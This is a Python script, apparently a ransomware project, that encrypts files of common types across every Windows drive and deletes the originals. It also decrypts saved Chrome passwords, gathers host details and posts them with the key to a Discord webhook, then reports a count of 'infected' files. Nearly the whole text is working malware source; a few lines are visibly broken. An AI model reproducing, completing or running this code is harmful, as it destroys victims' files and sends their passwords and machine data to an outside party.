# encryption
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import random
import string
import argparse

# sending msgs to discord
import requests


# para serializable sa json
import base64
import platform
import socket
import uuid
import psutil
import re
import json
import sqlite3
import shutil
import win32crypt
from datetime import timezone, datetime, timedelta
import ctypes

#pang kuha ng available drives ng victim
import win32api

# indicator
from termcolor import colored
import colorama


colorama.init()

parser = argparse.ArgumentParser(description="Basic usage of the script. (it's set to encrypt once script is running you have an option to decrypt it)")
parser.add_argument("-w", "--webhook", type=str, help="Set the Discord Webhook")
parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt Files")
args = parser.parse_args()
webHook_args = args.webhook


class Setup():
    def generate_random_key(self,length=20):
        all_characters = string.ascii_letters + string.digits + string.punctuation
        if length <= 20:
            length = 20
            # Randomly select characters to form the key
            key = ''.join(random.choice(all_characters) for _ in range(length))

            return key

    def get_all_files(self,startpath):

        extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

            'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
            'yml', 'yaml', 'json', 'xml', 'csv', # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
            'java', 'class', 'jar', # java source code
            'ps', 'bat', 'vb', # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
        ]

        for dirpath, dirs, files in os.walk(startpath):
            for i in files:
                absolute_path = os.path.abspath(os.path.join(dirpath, i))
                ext = absolute_path.split('.')[-1]
                if ext in extensions:
                    yield absolute_path


    def get_all_drives(self):
        drives_list = []

        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        drives_list.append(drives)

        return drives_list

    def send_infected_files_count(self, total_infected_files):
        webhook_url = webHook_args
        content = f"Total infected files: {total_infected_files}"
        data = {
            "embeds": [
                {
                    "title": content,
                    "color": 15548997,
                    "content" : total_infected_files
                }
            ]
        }

        response  = requests.post(webhook_url,json = data)
        if response.status_code == 204:
            print("success")
        else:
            print("error sending request")

class RansomeWare():

    def __init__(self, password):
        self.password = password

    def create_key_file(self,key):
        with open("key.txt","w") as f:
            f.write(key)

    # create key for each encryption (one time key for every attack)
    def derive_key(self, password: bytes, salt: bytes):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return kdf.derive(password)

    # Encrypt a file
    def encrypt_file(self, target):
        filename = target
        salt = os.urandom(16)  # Salt for key derivation
        key = self.derive_key(self.password.encode(), salt)
        iv = os.urandom(12)  # GCM requires a 12-byte IV (nonce)

        # Initialize AES-GCM cipher
        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
            backend=default_backend()
        ).encryptor()

        try:
            # Open the file in binary read mode
            with open(filename, 'rb') as f:
                plaintext = f.read()
                print(colored(f"{filename} successfully encrypted", "green"))
        except PermissionError:
            return
        except FileNotFoundError:
            return
        except Exception as e:
            print(colored(f"An error occurred while processing {filename}: {e}"), "black", "on_light_red")
            return

        try:
            # Encrypt the file contents
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            encrypted_filename = filename + ".encrypted"

            # Write the encrypted file
            with open(encrypted_filename, 'wb') as f:
                f.write(salt + iv + encryptor.tag + ciphertext)

            # Remove the original file after encryption
            os.remove(filename)
            print(f"Original file {filename} deleted. Encrypted file saved as {encrypted_filename}.")

        except Exception as e:
            return  # Skip this file and move on to the next one

    # Decrypt a file
    def decrypt_file(self,target):
        filename = f"{target}.encrypted"


        with open("key.txt","r") as f:
            password_file = f.read()
        with open(filename, 'rb') as f:
            salt = f.read(16)
            iv = f.read(12)
            tag = f.read(16)
            ciphertext = f.read()

        key = self.derive_key(password_file.encode(), salt)
        decryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv, tag),
            backend=default_backend()
        ).decryptor()

        plaintext = decryptor.update(ciphertext) + decryptor.finalize()


        decrypted_filename = filename.replace(".encrypted", "")
        with open(decrypted_filename, 'wb') as f:
            f.write(plaintext)
        os.remove(filename)
        print(f"Decrypted file saved as {decrypted_filename}.")

    def fetching_encryption_key(self):
        local_computer_directory_path = os.path.join(
          os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
          "User Data", "Local State")

        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
          local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]


        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    #get all info on the machine return as json para sa webhook
    def get_machine_info(self):
        key = None
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"

        #check if user is running on chrome
        if os.path.exists(db_path):
            key = self.fetching_encryption_key()
            shutil.copyfile(db_path, filename)

            # connecting to the database
            db = sqlite3.connect(filename)
            cursor = db.cursor()

            # 'logins' table has the data
            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")


            for row in cursor.fetchall():
                main_url = row[0]
                login_page_url = row[1]
                user_name = row[2]
                decrypted_password = self.password_decryption(row[3], key)
                date_of_creation = row[4]
                last_usuage = row[5]
                creation_date = None
                last_used = None

                if date_of_creation != 86400000000 and date_of_creation:
                    creation_date = f"Creation date: {str(self.chrome_date_and_time(date_of_creation))}"
                else:
                    pass

                if last_usuage != 86400000000 and last_usuage:
                    last_used = f"Last Used: {str(self.chrome_date_and_time(last_usuage))}"
                else:
                    last_used = "None"

                if user_name or decrypted_password:
                    info = {
                    "Decryption Key" : self.password,
                    "Platform": platform.system(),
                    "Platform Release": platform.release(),
                    "Platform Version": platform.version(),
                    "Architecture": platform.machine(),
                    "Hostname": socket.gethostname(),
                    "IP Address": socket.gethostbyname(socket.gethostname()),
                    "MAC Address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
                    "Processor": platform.processor(),
                    "RAM": str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB",
                    "Main URL": main_url,
                    "Login URL" : login_page_url,
                    "User name" : user_name,
                    "Decrypted Password" : decrypted_password,
                    "Creation Date " : creation_date,
                    "Last Used " : last_used,
                    "[!]" : "=" * 50
                    }
                    return info
                else:
                    continue

            cursor.close()
            db.close()

            try:
                # trying to remove the copied db file as
                os.remove(filename)
            except:
                pass
        else:
            info = {
            "Decryption Key" : self.password,
            "Platform": platform.system(),
            "Platform Release": platform.release(),
            "Platform Version": platform.version(),
            "Architecture": platform.machine(),
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "MAC Address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            "Processor": platform.processor(),
            "RAM": str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB",
            "[!]" : "=" * 50
            }
            return info

    # get machine local chrome database time
    def chrome_date_and_time(self, chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def password_decryption(self, password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def connect_webHook(self):
        webhook_url = webHook_args

        get_info = self.get_machine_info()

        # Create fields for each item in the dictionary
        fields = [{"name": key, "value": value, "inline": False} for key, value in get_info.items()]
        data = {
            "embeds": [
                {
                    "title": "Victim's Information",
                    "color": 15548997,
                    "fields" : fields
                }
            ]
        }

        response  = requests.post(webhook_url,json = data)
        print(response)
        if response.status_code == 204:
            print(colored("[+] request successfully sent to webhook! [+]", "green")
        else:
            print(colored("[-] error sending request [-]", "red"))



total_infected_files = 0
setup = Setup()
key = setup.generate_random_key()
with open("key.txt", "w") as f:
    f.write(key)

drives = setup.get_all_drives()
ransom = RansomeWare(key)
if args.decrypt:
    pass
else:
    ransom.connect_webHook()

# loop thru available disk then loop thru its content [directory and files]
for drive in drives:
    for x in drive:
        for file_path in setup.get_all_files(x): # returns the full path of filtered file
            total_infected_files += 1
            if args.decrypt:
                ransom.decrypt_file(file_path)
            else:
                ransom.encrypt_file(file_path)

# send the total encrypted files to webhook
setup.send_infected_files_count(total_infected_files)
